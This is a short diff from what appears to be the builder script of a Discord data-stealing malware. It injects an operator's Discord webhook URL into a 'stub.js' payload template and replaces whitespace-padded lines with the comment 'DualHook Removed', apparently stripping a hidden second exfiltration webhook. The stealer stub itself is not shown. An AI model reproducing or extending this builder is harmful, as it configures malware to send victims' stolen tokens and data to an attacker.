@@ -102,9 +102,7 @@ async function main() {
       /const discordWebhookUrl = 'REMPLACE_ME';/,
       `const discordWebhookUrl = '${webhookURL}';`
     );
-          
-        
-        
+    //DualHook Removed
     
     if (stubCode === updatedStubCode) {
       throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
